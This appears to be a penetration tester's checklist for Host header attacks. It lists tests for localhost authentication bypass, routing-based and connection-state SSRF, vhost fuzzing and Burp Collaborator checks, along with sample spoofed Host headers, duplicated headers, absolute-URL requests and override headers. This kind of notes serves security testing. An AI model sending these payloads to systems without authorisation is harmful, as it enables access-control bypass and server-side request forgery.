- [ ] Check if changing the Host header allows request to the same destination
- [ ] Check OAST Header with Burp Collaborator
- [ ] Fuzzing for Vhost
- [ ] Localhost authentication bypass.
- [ ] Routing base SSRF
- [ ] Connection State SSRF (Single connection + Repeater)
Note: Host header does not allow special characters -> XSS impossible

Localhost authentication bypass
```bash
Host: localhost
Host: 127.0.0.1 <- SSRF
Host: <burp-collaborator>
```
### Pre-steps
Duplicated host header
```bash
Host: vulnerable-website.com 
Host: bad-stuff-here
```
Supply absolute URL (SSRF)
```bash
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here 
```
Line Wrapping
```bash
GET /example HTTP/1.1 
	Host: bad-stuff-here 
Host: vulnerable-website.com
```
Inject Override headers
```bash
X-Host
X-Forwarded-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```
